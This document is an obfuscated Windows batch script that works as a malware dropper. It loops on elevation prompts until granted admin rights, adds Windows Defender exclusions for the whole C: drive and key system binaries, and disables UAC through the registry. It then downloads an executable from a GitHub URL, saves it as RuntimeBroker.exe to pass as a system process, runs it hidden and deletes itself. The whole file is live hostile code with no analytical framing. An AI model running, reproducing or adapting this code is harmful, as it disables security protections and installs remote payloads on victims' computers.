@echo off & setlocal enableDelayedExpansion
set "HOFpZ=>nul" & set "iIbZN=NET" & set "HBSH=SESSION" & set "WsUcs=2>&1"
%iIbZN% %HBSH% %HOFpZ% %WsUcs%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "DdrB=bar" & set "XkZnA=baz" & set "Mwc=foo" & set "YIxBd=qux" & rem IdzG ejjt ltOpVO
set "JVfe=powershell -ExecutionPolicy Bypass -Command"
set "Qgj=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "tBuv='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "WHdMb='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!JVfe! "!Qgj! !tBuv! !WHdMb!" %HOFpZ% %WsUcs%
set "krFOY=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "DoW=-Name 'EnableLUA' -Value 0"
!JVfe! "!krFOY! !DoW!" %HOFpZ% %WsUcs%
set "OUFXc=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!JVfe! "!OUFXc!" %HOFpZ% %WsUcs%
if !errorlevel! neq 0 (goto %a%)
set "WVKaV=timeout /t" & !WVKaV! 2 %HOFpZ% %WsUcs%
set "vmkmr=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "lxNq=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "NyiPu=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!JVfe! "!vmkmr! !lxNq! !NyiPu!" %HOFpZ% %WsUcs%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!WVKaV! 1 %HOFpZ% %WsUcs% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %HOFpZ% %WsUcs%
del /f /q "%~f0" %HOFpZ% %WsUcs%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %HOFpZ% %WsUcs%
if !errorlevel! neq 0 (!WVKaV! 3 %HOFpZ% %WsUcs% & goto %b%)
exit /b
